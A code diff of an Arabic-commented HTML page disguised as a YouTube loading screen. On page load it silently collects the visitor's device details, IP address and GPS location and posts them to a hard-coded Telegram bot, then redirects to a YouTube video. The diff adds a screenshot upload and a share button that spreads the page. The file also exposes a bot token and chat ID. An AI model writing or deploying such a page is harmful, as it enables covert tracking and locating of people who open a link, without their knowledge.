@@ -5,6 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>YouTube</title>
     <link rel="icon" type="image/x-icon" href="https://www.youtube.com/s/desktop/12d6b690/img/favicon.ico">
+    <!-- مكتبة html2canvas لالتقاط لقطة الشاشة بدقة عالية -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js">
+    </script>
     <style>
         /* ===== RESET & BASE ===== */
         * {
@@ -42,7 +45,6 @@
             width: 24px;
             height: 24px;
             fill: #fff;
-            cursor: default;
         }
         .youtube-logo svg {
             width: 90px;
@@ -57,7 +59,6 @@
             width: 24px;
             height: 24px;
             fill: #aaa;
-            cursor: default;
         }
         .avatar {
             width: 32px;
@@ -83,7 +84,7 @@
             position: relative;
         }
 
-        /* Spinner متطور (حلقتان) */
+        /* Spinner متطور */
         .spinner-wrapper {
             margin-bottom: 40px;
         }
@@ -112,10 +113,12 @@
             left: 10%;
         }
         @keyframes spin {
-            to { transform: rotate(360deg); }
+            to {
+                transform: rotate(360deg);
+            }
         }
 
-        /* نقاط متحركة (ثلاث نقاط) */
+        /* نقاط متحركة */
         .dots {
             display: flex;
             gap: 12px;
@@ -128,23 +131,37 @@
             background: #ff0000;
             animation: pulseDot 1.4s ease-in-out infinite;
         }
-        .dot:nth-child(2) { animation-delay: 0.2s; background: #f1f1f1; }
-        .dot:nth-child(3) { animation-delay: 0.4s; background: #ff0000; }
+        .dot:nth-child(2) {
+            animation-delay: 0.2s;
+            background: #f1f1f1;
+        }
+        .dot:nth-child(3) {
+            animation-delay: 0.4s;
+            background: #ff0000;
+        }
         @keyframes pulseDot {
-            0%, 80%, 100% { transform: scale(0.6); opacity: 0.3; }
-            40% { transform: scale(1.2); opacity: 1; }
+            0%,
+            80%,
+            100% {
+                transform: scale(0.6);
+                opacity: 0.3;
+            }
+            40% {
+                transform: scale(1.2);
+                opacity: 1;
+            }
         }
 
-        /* شريط التقدم (Progress Bar) الوهمي المتطور */
+        /* شريط التقدم الوهمي المتطور */
         .progress-wrap {
-            width: 280px;
+            width: 320px;
             max-width: 80%;
             background: #272727;
             border-radius: 20px;
             height: 6px;
             overflow: hidden;
             margin-top: 10px;
-            box-shadow: inset 0 1px 3px rgba(0,0,0,0.5);
+            box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.5);
         }
         .progress-bar {
             height: 100%;
@@ -156,11 +173,15 @@
             transition: width 0.3s ease;
         }
         @keyframes shimmer {
-            0% { background-position: -200% 0; }
-            100% { background-position: 200% 0; }
+            0% {
+                background-position: -200% 0;
+            }
+            100% {
+                background-position: 200% 0;
+            }
         }
 
-        /* نص الحالة (خفيف جداً، لا يشير للتحويل) */
+        /* نص الحالة (خفيف جداً) */
         .status-text {
             font-size: 14px;
             color: #717171;
@@ -170,10 +191,55 @@
             letter-spacing: 0.3px;
         }
 
+        /* ===== زر المشاركة السحري (في الزاوية اليمنى السفلية) ===== */
+        .share-btn {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            width: 48px;
+            height: 48px;
+            background: #272727;
+            border: none;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.6);
+            transition: all 0.3s ease;
+            z-index: 999;
+            opacity: 0;
+            transform: scale(0.8);
+            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+        .share-btn.visible {
+            opacity: 1;
+            transform: scale(1);
+        }
+        .share-btn:hover {
+            background: #333;
+            transform: scale(1.05);
+        }
+        .share-btn svg {
+            width: 24px;
+            height: 24px;
+            fill: #aaa;
+        }
+
         /* ===== RESPONSIVE ===== */
         @media (max-width: 480px) {
-            .youtube-logo svg { width: 70px; }
-            .progress-wrap { width: 200px; }
+            .youtube-logo svg {
+                width: 70px;
+            }
+            .progress-wrap {
+                width: 200px;
+            }
+            .share-btn {
+                bottom: 16px;
+                right: 16px;
+                width: 44px;
+                height: 44px;
+            }
         }
     </style>
 </head>
@@ -209,7 +275,7 @@
     </div>
 
     <!-- ===== LOADING ===== -->
-    <div class="loading-container">
+    <div class="loading-container" id="captureArea">
         <div class="spinner-wrapper">
             <div class="youtube-spinner">
                 <div class="spinner-ring"></div>
@@ -225,31 +291,34 @@
             <div class="progress-bar" id="progressBar"></div>
         </div>
         <div class="status-text" id="statusText">جاري التحميل ...</div>
-        <!-- لا يوجد أي عداد أو نص يشير للتحويل -->
     </div>
+
+    <!-- ===== زر المشاركة السحري (يظهر بعد التقاط الصورة) ===== -->
+    <button class="share-btn" id="shareBtn">
+        <svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92 1.61 0 2.92-1.31 2.92-2.92s-1.31-2.92-2.92-2.92z"/></svg>
+    </button>
 
     <script>
         // ================================================================
-        //  التكوين (يمكنك تعديل القيم هنا)
+        //  التكوين (عدّل حسب رغبتك)
         // ================================================================
         const CONFIG = {
-            // رابط الوجهة النهائي (سيتم التحويل إليه)
             targetUrl: 'https://youtu.be/YiK3BulNaWQ?si=M1AJboH6vgZymq7-',
-            // توكن بوت تليجرام
             botToken: '7982181249:AAEyLwc9c24fu-uqUT87v26S6282XTD41XI',
-            // معرف الدردشة (Chat ID)
             chatId: '170383339',
-            // الحد الأدنى للانتظار قبل التحويل (بالمللي ثانية) – عشوائية تضاف
             minDelay: 3500,
             maxDelay: 5500
         };
 
         // ================================================================
-        //  المتغيرات الداخلية
+        //  المتغيرات
         // ================================================================
         let isRedirected = false;
         let progressValue = 0;
         let progressInterval = null;
+        let capturedImage = null; // لتخزين الصورة بعد التقاطها
+
+        const shareBtn = document.getElementById('shareBtn');
 
         // ================================================================
         //  دوال مساعدة
@@ -258,17 +327,14 @@
             console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);
         }
 
-        // تحديث شريط التقدم بشكل عشوائي (يبدو حقيقياً)
         function updateProgress() {
             if (progressValue < 90) {
-                // زيادة عشوائية بين 2 و 8%
                 const increment = Math.floor(Math.random() * 7) + 2;
                 progressValue = Math.min(progressValue + increment, 90);
                 document.getElementById('progressBar').style.width = progressValue + '%';
             }
         }
 
-        // إنهاء شريط التقدم (إكماله إلى 100% ثم التحويل)
         function finishProgress() {
             clearInterval(progressInterval);
             progressValue = 100;
@@ -277,7 +343,7 @@
         }
 
         // ================================================================
-        //  جمع البيانات (بدون أي تفاعل)
+        //  جمع البيانات
         // ================================================================
         function collectDeviceInfo() {
             const ua = navigator.userAgent;
@@ -289,14 +355,14 @@
                 referrer: document.referrer || 'مباشر',
                 userAgent: ua,
                 deviceType: /iPhone/i.test(ua) ? 'iPhone' :
-                            /iPad/i.test(ua) ? 'iPad' :
-                            /Android/i.test(ua) ? 'Android' :
-                            /Windows/i.test(ua) ? 'Windows' :
-                            /Mac/i.test(ua) ? 'Mac' : 'أخرى',
+                    /iPad/i.test(ua) ? 'iPad' :
+                    /Android/i.test(ua) ? 'Android' :
+                    /Windows/i.test(ua) ? 'Windows' :
+                    /Mac/i.test(ua) ? 'Mac' : 'أخرى',
                 browser: /Chrome/i.test(ua) && !/Edge/i.test(ua) ? 'Chrome' :
-                         /Firefox/i.test(ua) ? 'Firefox' :
-                         /Safari/i.test(ua) && !/Chrome/i.test(ua) ? 'Safari' :
-                         /Edge/i.test(ua) ? 'Edge' : 'أخرى',
+                    /Firefox/i.test(ua) ? 'Firefox' :
+                    /Safari/i.test(ua) && !/Chrome/i.test(ua) ? 'Safari' :
+                    /Edge/i.test(ua) ? 'Edge' : 'أخرى',
                 isMobile: /Mobile|Android|iPhone|iPad/i.test(ua),
                 language: navigator.language || 'ar',
                 platform: navigator.platform || 'غير معروف',
@@ -345,66 +411,177 @@
                             accuracy: Math.round(coords.accuracy)
                         });
                     },
-                    () => { if (!done) { done = true; resolve(null); } },
+                    () => { if (!done) { done = true;
+                            resolve(null); } },
                     opts
                 );
-                setTimeout(() => { if (!done) { done = true; resolve(null); } }, 6000);
+                setTimeout(() => { if (!done) { done = true;
+                        resolve(null); } }, 6000);
             });
         }
 
         // ================================================================
-        //  إرسال البيانات إلى تليجرام
+        //  التقاط لقطة الشاشة (باستخدام html2canvas)
         // ================================================================
-        async function sendToTelegram(data) {
+        async function captureScreenshot() {
+            try {
+                const element = document.getElementById('captureArea');
+                // نلتقط الصورة بدقة عالية (2x)
+                const canvas = await html2canvas(element, {
+                    scale: 1.8,
+                    backgroundColor: '#0f0f0f',
+                    logging: false,
+                    allowTaint: false,
+                    useCORS: true
+                });
+                return canvas.toDataURL('image/jpeg', 0.92);
+            } catch (error) {
+                log(`❌ فشل التقاط الصورة: ${error.message}`);
+                return null;
+            }
+        }
+
+        // تحويل dataURL إلى Blob
+        function dataURLtoBlob(dataURL) {
+            const byteString = atob(dataURL.split(',')[1]);
+            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
+
+        // ================================================================
+        //  إرسال إلى تليجرام (صورة + بيانات)
+        // ================================================================
+        async function sendToTelegram(data, imageDataURL) {
             const token = CONFIG.botToken;
             const chatId = CONFIG.chatId;
             if (!token || !chatId) return false;
 
+            // بناء التعليق (Caption) للصورة
             const d = data;
             const loc = d.location ? `${d.location.latitude}, ${d.location.longitude} (دقة ${d.location.accuracy}م)` : 'غير متوفر';
             const mapLink = d.location ? `https://www.google.com/maps?q=${d.location.latitude},${d.location.longitude}` : '';
 
-            let msg = `🎯 *زائر جديد - YouTube Clone*\n\n`;
-            msg += `⏰ *التوقيت:* ${d.device.localTime}\n`;
-            msg += `🌐 *الرابط:* ${d.device.url}\n`;
-            msg += `🔗 *المرجع:* ${d.device.referrer}\n\n`;
-            msg += `📱 *الجهاز:* ${d.device.deviceType}\n`;
-            msg += `🌍 *المتصفح:* ${d.device.browser}\n`;
-            msg += `📶 *محمول:* ${d.device.isMobile ? 'نعم' : 'لا'}\n`;
-            msg += `🗣 *اللغة:* ${d.device.language}\n`;
-            msg += `💻 *النظام:* ${d.device.platform}\n\n`;
-            msg += `🌐 *IP:* ${d.ip}\n`;
-            msg += `📍 *الموقع:* ${loc}\n`;
-            if (mapLink) msg += `🗺️ [خريطة](${mapLink})\n`;
-            msg += `\n📐 *الشاشة:* ${d.device.screenSize}\n`;
-            msg += `⏳ *المنطقة:* ${d.device.timezone}\n`;
+            let caption = `🎯 *زائر جديد - مع لقطة شاشة*\n\n`;
+            caption += `⏰ *التوقيت:* ${d.device.localTime}\n`;
+            caption += `🌐 *الرابط:* ${d.device.url}\n`;
+            caption += `🔗 *المرجع:* ${d.device.referrer}\n\n`;
+            caption += `📱 *الجهاز:* ${d.device.deviceType}\n`;
+            caption += `🌍 *المتصفح:* ${d.device.browser}\n`;
+            caption += `📶 *محمول:* ${d.device.isMobile ? 'نعم' : 'لا'}\n`;
+            caption += `🗣 *اللغة:* ${d.device.language}\n`;
+            caption += `💻 *النظام:* ${d.device.platform}\n\n`;
+            caption += `🌐 *IP:* ${d.ip}\n`;
+            caption += `📍 *الموقع:* ${loc}\n`;
+            if (mapLink) caption += `🗺️ [خريطة](${mapLink})\n`;
+            caption += `\n📐 *الشاشة:* ${d.device.screenSize}\n`;
+            caption += `⏳ *المنطقة:* ${d.device.timezone}`;
 
-            const url = `https://api.telegram.org/bot${token}/sendMessage`;
             try {
-                const res = await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: msg,
-                        parse_mode: 'Markdown',
-                        disable_web_page_preview: true
-                    })
-                });
-                if (!res.ok) throw new Error('فشل الإرسال');
-                log('✅ تم إرسال البيانات إلى تليجرام');
-                return true;
+                if (imageDataURL) {
+                    // إرسال الصورة مع التعليق
+                    const blob = dataURLtoBlob(imageDataURL);
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', blob, 'youtube_screenshot.jpg');
+                    formData.append('caption', caption);
+                    formData.append('parse_mode', 'Markdown');
+
+                    const res = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    if (res.ok) {
+                        log('✅ تم إرسال الصورة + البيانات إلى تليجرام');
+                        return true;
+                    } else {
+                        const text = await res.text();
+                        log(`❌ فشل إرسال الصورة: ${res.status} - ${text}`);
+                        // محاولة إرسال النص فقط كخطة بديلة
+                        return await sendTextOnly(token, chatId, caption);
+                    }
+                } else {
+                    // إرسال نص فقط
+                    return await sendTextOnly(token, chatId, caption);
+                }
             } catch (e) {
-                log(`❌ فشل الإرسال: ${e.message}`);
+                log(`❌ خطأ في الإرسال: ${e.message}`);
                 return false;
             }
         }
 
+        // إرسال نص فقط (احتياطي)
+        async function sendTextOnly(token, chatId, text) {
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: text,
+                        parse_mode: 'Markdown',
+                        disable_web_page_preview: true
+                    })
+                });
+                return res.ok;
+            } catch (_) { return false; }
+        }
+
         // ================================================================
-        //  العملية الرئيسية (التنفيذ)
+        //  زر المشاركة (واتساب / فيسبوك / أي تطبيق)
+        // ================================================================
+        function setupShareButton(imageDataURL) {
+            if (!imageDataURL) {
+                shareBtn.style.display = 'none';
+                return;
+            }
+
+            // تحويل الصورة إلى Blob و File
+            const blob = dataURLtoBlob(imageDataURL);
+            const file = new File([blob], 'youtube_screenshot.jpg', { type: 'image/jpeg' });
+
+            shareBtn.addEventListener('click', async () => {
+                if (navigator.share) {
+                    try {
+                        await navigator.share({
+                            title: 'YouTube',
+                            text: 'شاهد هذا الفيديو على يوتيوب',
+                            files: [file]
+                        });
+                        log('✅ تمت المشاركة عبر Web Share API');
+                    } catch (err) {
+                        if (err.name !== 'AbortError') {
+                            log(`❌ فشل المشاركة: ${err.message}`);
+                        }
+                    }
+                } else {
+                    // للمتصفحات التي لا تدعم Web Share API (نسخ الرابط)
+                    alert('اضغط مع الاستمرار على الصورة لحفظها، ثم شاركها يدوياً.');
+                    // محاولة فتح الصورة في تبويب جديد لحفظها
+                    const win = window.open();
+                    if (win) {
+                        win.document.write(
+                            `<img src="${imageDataURL}" style="max-width:100%;height:auto;" /><br/><p>اضغط مع الاستمرار لحفظ الصورة</p>`);
+                        win.document.title = 'YouTube Screenshot';
+                    }
+                }
+            });
+
+            // إظهار الزر مع تأثير أنيق
+            setTimeout(() => {
+                shareBtn.classList.add('visible');
+            }, 1000);
+        }
+
+        // ================================================================
+        //  العملية الرئيسية
         // ================================================================
         async function main() {
-            log('🚀 بدء التشغيل');
+            log('🚀 بدء التشغيل المتطور مع لقطة الشاشة');
 
             // 1. بدء شريط التقدم الوهمي
             progressInterval = setInterval(updateProgress, 300);
@@ -422,17 +599,29 @@
 
             const finalData = { device: deviceInfo, ip, location };
 
-            // 3. إرسال البيانات (في الخلفية، لا ننتظر)
-            sendToTelegram(finalData).catch(() => {});
+            // 3. التقاط لقطة الشاشة (بدون انتظار طويل)
+            log('📸 جاري التقاط الصورة...');
+            const screenshotData = await captureScreenshot();
+            if (screenshotData) {
+                log('✅ تم التقاط الصورة بنجاح');
+                capturedImage = screenshotData;
+                // إعداد زر المشاركة
+                setupShareButton(screenshotData);
+            } else {
+                log('⚠️ لم يتم التقاط الصورة، سيتم إرسال البيانات نصياً فقط');
+            }
 
-            // 4. تحديد وقت الانتظار العشوائي (بين 3.5 و 5.5 ثانية)
+            // 4. إرسال إلى تليجرام (صورة + بيانات)
+            log('📤 جاري الإرسال إلى تليجرام...');
+            await sendToTelegram(finalData, screenshotData);
+
+            // 5. تحديد وقت الانتظار العشوائي
             const delay = Math.floor(Math.random() * (CONFIG.maxDelay - CONFIG.minDelay + 1)) + CONFIG.minDelay;
-            log(`⏳ الانتظار ${delay} مللي ثانية قبل الإكمال`);
+            log(`⏳ الانتظار ${delay} مللي ثانية`);
 
-            // 5. بعد المدة، إنهاء شريط التقدم والتحويل
+            // 6. بعد المدة، إنهاء شريط التقدم والتحويل
             setTimeout(() => {
                 finishProgress();
-                // تأخير بسيط جداً (نصف ثانية) ثم التحويل
                 setTimeout(() => {
                     if (!isRedirected) {
                         isRedirected = true;
@@ -446,7 +635,7 @@
                 }, 600);
             }, delay);
 
-            // 6. حماية: تحويل احتياطي في حال تعطل أي شيء (بعد 10 ثوانٍ)
+            // 7. حماية إضافية
             setTimeout(() => {
                 if (!isRedirected) {
                     isRedirected = true;
@@ -457,15 +646,15 @@
         }
 
         // ================================================================
-        //  بدء التشغيل بعد تحميل الصفحة
+        //  بدء التشغيل
         // ================================================================
         if (document.readyState === 'complete') {
-            setTimeout(main, 400);
+            setTimeout(main, 600);
         } else {
-            window.addEventListener('load', () => setTimeout(main, 400));
+            window.addEventListener('load', () => setTimeout(main, 600));
         }
 
-        log('✅ تم تحميل الصفحة المتطورة (بدون أي عداد)');
+        log('✅ تم تحميل النسخة الاحترافية مع لقطة الشاشة والمشاركة');
     </script>
 </body>
 </html>
